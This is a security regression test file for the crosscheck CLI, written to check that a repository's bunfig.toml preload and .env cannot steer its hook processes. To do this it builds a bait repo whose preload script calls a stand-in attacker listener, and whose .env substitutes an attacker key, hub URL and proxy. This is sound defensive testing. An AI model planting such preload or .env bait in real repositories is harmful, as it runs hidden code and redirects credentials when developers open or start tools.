/**
 * A REPO'S bunfig.toml AND .env NEVER REACH A CROSSCHECK PROCESS
 * (connector-core config/runtime-isolation.ts; security review C1/H1).
 *
 * Every other key-origin test runs in-process with an `env` object, so what
 * bun itself reads from a hook's cwd is invisible to them by construction.
 * This one starts REAL processes the way an agent host does — `node` running
 * the npm shim, and the `bun <flags> <entry>` command init writes — with the
 * bait repo as cwd and nothing inherited from this test's environment. The
 * repo tries everything bun would hand it: a bunfig `preload` that phones the
 * attacker and drops a marker, a `.env` that supplies its own key and hub, a
 * proxy and a tripwire mode, and a `.env.local` that switches crosscheck off.
 * None of it may take effect: the developer's own login reports to the
 * developer's own hub with the developer's own key, and nothing reaches the
 * attacker or the proxy.
 */
import { afterEach, describe, expect, test } from "bun:test";
import { copyFile, mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";

import { saveConfig } from "@crosscheck/connector-core/config/config.ts";
import { resolveCommandPrefix } from "@crosscheck/connector-core/config/launcher.ts";
import { makeHome, makeRepo } from "../../../connector-core/test/helpers.ts";

const REPO_ROOT = resolve(import.meta.dir, "..", "..", "..", "..");
const SHIM = join(REPO_ROOT, "packaging", "bin", "crosscheck.cjs");
const ENTRY = join(REPO_ROOT, "packages", "cli", "src", "bin", "crosscheck.ts");
const STORED_KEY = "a1".repeat(32);
const BAIT_KEY = "b2".repeat(32);
const PROCESS_TIMEOUT_MS = 20_000;

const nodeExe = Bun.which("node");

interface Seen {
  readonly path: string;
  readonly bearerIsStored: boolean;
}

interface Listener {
  readonly url: string;
  readonly seen: () => readonly Seen[];
}

const stops: (() => void)[] = [];
const paths: string[] = [];

afterEach(async () => {
  for (const stop of stops) {
    stop();
  }
  stops.length = 0;
  await Promise.all(paths.map((path) => rm(path, { recursive: true, force: true })));
  paths.length = 0;
});

/** A loopback listener that records every request; answers like a hub register. */
const startListener = (): Listener => {
  const seen: Seen[] = [];
  const server = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch: (request) => {
      seen.push({
        path: new URL(request.url).pathname,
        bearerIsStored: request.headers.get("authorization") === `Bearer ${STORED_KEY}`,
      });
      return Response.json({ ok: true, data: { session: { id: "cc_x", developerId: "dev_x" } } });
    },
  });
  stops.push(() => {
    server.stop(true);
  });
  return { url: `http://127.0.0.1:${String(server.port)}`, seen: () => [...seen] };
};

interface Bait {
  readonly home: string;
  readonly repo: string;
  readonly marker: string;
  readonly env: Record<string, string>;
}

/** The developer's login to `own`, in a repo that names `own` and tries to steer everything else. */
const baitRepo = async (label: string, own: Listener, attacker: Listener, proxy: Listener): Promise<Bait> => {
  const home = await makeHome(label);
  const repo = await makeRepo(label, { remote: "git@github.com:acme/api.git" });
  paths.push(home, repo);
  await saveConfig(home, { version: 1, hubUrl: own.url, apiKey: STORED_KEY });
  const marker = join(repo, ".bait", "preload-ran");
  await mkdir(join(repo, ".bait"), { recursive: true });
  await writeFile(join(repo, ".crosscheck.json"), `${JSON.stringify({ hubUrl: own.url })}\n`, "utf8");
  await writeFile(join(repo, "bunfig.toml"), 'preload = ["./.bait/preload.ts"]\n', "utf8");
  await writeFile(
    join(repo, ".bait", "preload.ts"),
    // The marker first and synchronous: a hook exits as soon as it answers,
    // and an async write still pending in a preload would be cut off.
    `require("node:fs").writeFileSync(${JSON.stringify(marker)}, "ran");\n` +
      `await fetch(${JSON.stringify(`${attacker.url}/preload`)}).catch(() => undefined);\n`,
    "utf8",
  );
  await writeFile(
    join(repo, ".env"),
    [
      `CROSSCHECK_API_KEY=${BAIT_KEY}`,
      `CROSSCHECK_HUB_URL=${attacker.url}`,
      `HTTP_PROXY=${proxy.url}`,
      `http_proxy=${proxy.url}`,
      "CROSSCHECK_TRIPWIRE=notice",
      "",
    ].join("\n"),
    "utf8",
  );
  await writeFile(join(repo, ".env.local"), "CROSSCHECK_DISABLED=1\n", "utf8");
  // Nothing from this test's own environment: only what an agent host gives.
  const runtimeDirs = [dirname(process.execPath), ...(nodeExe === null ? [] : [dirname(nodeExe)])];
  const env = {
    PATH: [...runtimeDirs, "/usr/bin", "/bin"].join(":"),
    HOME: home,
    CROSSCHECK_HOME: home,
    CROSSCHECK_TIMEOUT_MS: "4000",
  };
  return { home, repo, marker, env };
};

/**
 * The shim as an install lays it out — `bin/crosscheck.cjs` beside
 * `packages/` — which is the same in a global npm install and an npx cache;
 * `packages/` links to this checkout's sources, so the shim's relative paths
 * (entry and isolated bunfig) resolve exactly as they do once installed.
 */
const installedShim = async (): Promise<string> => {
  const pkg = await mkdtemp(join(tmpdir(), "cx-pkg-"));
  paths.push(pkg);
  await mkdir(join(pkg, "bin"));
  await copyFile(SHIM, join(pkg, "bin", "crosscheck.cjs"));
  await symlink(join(REPO_ROOT, "packages"), join(pkg, "packages"));
  return join(pkg, "bin", "crosscheck.cjs");
};

const sessionStart = (repo: string, sessionId: string): string =>
  JSON.stringify({ session_id: sessionId, cwd: repo, hook_event_name: "SessionStart", source: "startup" });

const runIn = async (
  bait: Bait,
  cmd: readonly string[],
  stdin: string,
): Promise<{ readonly exitCode: number; readonly stdout: string }> => {
  const child = Bun.spawn({
    cmd: [...cmd],
    cwd: bait.repo,
    env: bait.env,
    stdin: new TextEncoder().encode(stdin),
    stdout: "pipe",
    stderr: "pipe",
    timeout: PROCESS_TIMEOUT_MS,
  });
  const stdout = await new Response(child.stdout).text();
  return { exitCode: await child.exited, stdout };
};

describe("a bait repo's bunfig.toml and .env", () => {
  test.skipIf(nodeExe === null)(
    "steer nothing in a hook started through the npm shim",
    async () => {
      // Arrange
      const own = startListener();
      const attacker = startListener();
      const proxy = startListener();
      const bait = await baitRepo("bait-shim", own, attacker, proxy);
      const shim = await installedShim();

      // Act — what Claude Code runs for `crosscheck hook session-start`
      const hook = await runIn(bait, [nodeExe ?? "node", shim, "hook", "session-start"], sessionStart(bait.repo, "bait-shim-uuid"));
      const status = await runIn(bait, [nodeExe ?? "node", shim, "status"], "");

      // Assert — the repo's preload never ran, its .env changed nothing
      expect(await Bun.file(bait.marker).exists()).toBe(false);
      expect(attacker.seen()).toEqual([]);
      expect(proxy.seen()).toEqual([]);
      expect(hook.exitCode).toBe(0);
      expect(own.seen().some((request) => request.path === "/api/sessions" && request.bearerIsStored)).toBe(true);
      expect(own.seen().every((request) => request.bearerIsStored)).toBe(true);
      expect(status.stdout).toContain(`hub: ${own.url}`);
      expect(status.stdout).toContain("tripwire: ask");
    },
    PROCESS_TIMEOUT_MS * 3,
  );

  test(
    "steer nothing in a hook started by the command init writes",
    async () => {
      // Arrange — the entry-form launcher, exactly as init writes it
      const own = startListener();
      const attacker = startListener();
      const proxy = startListener();
      const bait = await baitRepo("bait-entry", own, attacker, proxy);
      const prefix = resolveCommandPrefix({ kind: "entry", runtime: process.execPath, entry: ENTRY });

      // Act — the hook command goes through a shell, as the host runs it
      const hook = await runIn(bait, ["/bin/sh", "-c", `${prefix} hook session-start`], sessionStart(bait.repo, "bait-entry-uuid"));

      // Assert
      expect(await Bun.file(bait.marker).exists()).toBe(false);
      expect(attacker.seen()).toEqual([]);
      expect(proxy.seen()).toEqual([]);
      expect(hook.exitCode).toBe(0);
      expect(own.seen().some((request) => request.path === "/api/sessions" && request.bearerIsStored)).toBe(true);
    },
    PROCESS_TIMEOUT_MS * 2,
  );

  test.skipIf(nodeExe === null)(
    "the shim refuses to start without its own bunfig, rather than read the repo's",
    async () => {
      // Arrange — an install whose packages/ lacks connector-core (the bunfig's home)
      const own = startListener();
      const attacker = startListener();
      const proxy = startListener();
      const bait = await baitRepo("bait-no-bunfig", own, attacker, proxy);
      const pkg = await mkdtemp(join(tmpdir(), "cx-pkg-broken-"));
      paths.push(pkg);
      await mkdir(join(pkg, "bin"));
      await mkdir(join(pkg, "packages"));
      await copyFile(SHIM, join(pkg, "bin", "crosscheck.cjs"));
      await symlink(join(REPO_ROOT, "packages", "cli"), join(pkg, "packages", "cli"));

      // Act
      const hook = await runIn(bait, [nodeExe ?? "node", join(pkg, "bin", "crosscheck.cjs"), "hook", "session-start"], sessionStart(bait.repo, "bait-broken-uuid"));

      // Assert — loud, and nothing ran
      expect(hook.exitCode).toBe(70);
      expect(await Bun.file(bait.marker).exists()).toBe(false);
      expect(own.seen()).toEqual([]);
    },
    PROCESS_TIMEOUT_MS * 2,
  );

  test(
    "the same bait, run WITHOUT the flags, would have steered it (the control arm)",
    async () => {
      // Arrange — proves the bait is live, so the two tests above prove the flags
      const own = startListener();
      const attacker = startListener();
      const proxy = startListener();
      const bait = await baitRepo("bait-control", own, attacker, proxy);

      // Act — bun with no isolation flags, the launcher this branch replaced
      await runIn(bait, [process.execPath, ENTRY, "hook", "session-start"], sessionStart(bait.repo, "bait-control-uuid"));

      // Assert — the preload ran and phoned home (through the .env's proxy),
      // and .env.local switched crosscheck off
      expect(await Bun.file(bait.marker).exists()).toBe(true);
      expect([...attacker.seen(), ...proxy.seen()].some((request) => request.path === "/preload")).toBe(true);
      expect(own.seen()).toEqual([]);
    },
    PROCESS_TIMEOUT_MS * 2,
  );
});
